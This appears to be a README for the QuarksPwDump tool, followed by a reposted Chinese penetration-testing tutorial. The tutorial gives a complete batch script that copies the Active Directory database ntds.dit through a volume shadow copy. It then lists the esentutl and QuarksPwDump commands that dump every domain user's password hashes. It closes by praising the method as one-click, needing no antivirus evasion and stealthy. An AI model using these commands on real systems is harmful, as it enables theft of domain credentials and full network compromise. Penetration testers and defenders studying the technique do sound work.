quarkspwdump
============

Dump various types of Windows credentials without injecting in any process.


转自：http://drops.wooyun.org/tips/6617
（1）使用ShadowCopy的命令行版，编写bat实现拷贝ntds.dit至当前目录

setlocal
if NOT "%CALLBACK_SCRIPT%"=="" goto :IS_CALLBACK
set SOURCE_DRIVE_LETTER=%SystemDrive%
set SOURCE_RELATIVE_PATH=\windows\ntds\ntds.dit
set DESTINATION_PATH=%~dp0
@echo ...Determine the scripts to be executed/generated...
set CALLBACK_SCRIPT=%~dpnx0
set TEMP_GENERATED_SCRIPT=GeneratedVarsTempScript.cmd
@echo ...Creating the shadow copy...
"%~dp0vsshadow.exe" -script=%TEMP_GENERATED_SCRIPT% -exec="%CALLBACK_SCRIPT%" %SOURCE_DRIVE_LETTER%
del /f %TEMP_GENERATED_SCRIPT%
@goto :EOF
:IS_CALLBACK
setlocal
@echo ...Obtaining the shadow copy device name...
call %TEMP_GENERATED_SCRIPT%
@echo ...Copying from the shadow copy to the destination path...
copy "%SHADOW_DEVICE_1%\%SOURCE_RELATIVE_PATH%" %DESTINATION_PATH%

参考链接： http://blogs.msdn.com/b/adioltean/archive/2005/01/05/346793.aspx

（2）使用QuarksPwDump直接读取信息并将结果导出至文件，先执行

esentutl /p /o ntds.dit
修复复制出来的数据库

QuarksPwDump.exe -dhb -hist -nt ntds.dit -o log.txt
读取并导出。

注：实际使用时ntds.dit和log.txt需要加绝对路径

Tips：

QuarksPwDump.exe：Dump various types of Windows credentials without injecting in any process.
源码下载链接，vs2010直接编译即可
https://github.com/quarkslab/quarkspwdump
0x07小结：

ShadowCopy+QuarksPwDump：

hash数量：所有用户
免杀：不需要
优点：
    获得信息全面
    bat一键搞定，简单高效
    无需下载ntds.dit，隐蔽性高
